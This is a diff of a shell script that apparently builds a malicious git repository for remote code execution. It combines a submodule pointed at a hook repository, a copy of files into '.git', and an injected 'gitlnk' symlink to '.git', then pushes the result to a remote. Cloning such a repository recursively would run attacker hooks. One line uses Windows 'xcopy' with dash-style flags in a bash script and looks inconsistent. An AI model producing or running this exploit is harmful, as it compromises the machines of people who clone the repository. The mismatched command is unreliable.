@@ -40,13 +40,14 @@ fi
 git clone --no-recursive "$main_repo_path" git_rce_main
 cd git_rce_main
 git rm gitlnk
-git commit -m "remove-symlink"
+git submodule set-url GITLNK/modules/RCE "$hook_repo_path"
+git add .gitmodules
 git submodule update --init --recursive
 git submodule update --remote GITLNK/modules/RCE
 git add GITLNK/modules/RCE
-git commit -m "update-submodule"
+xcopy GITLNK .git -b -e -v -r -i -g -h -o -c -k -y
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
-git commit -m "add-symlink"
+git commit -m "update-submodule"
 git reset --hard HEAD
 git clean -fd
 git push origin $(git rev-parse --abbrev-ref HEAD)
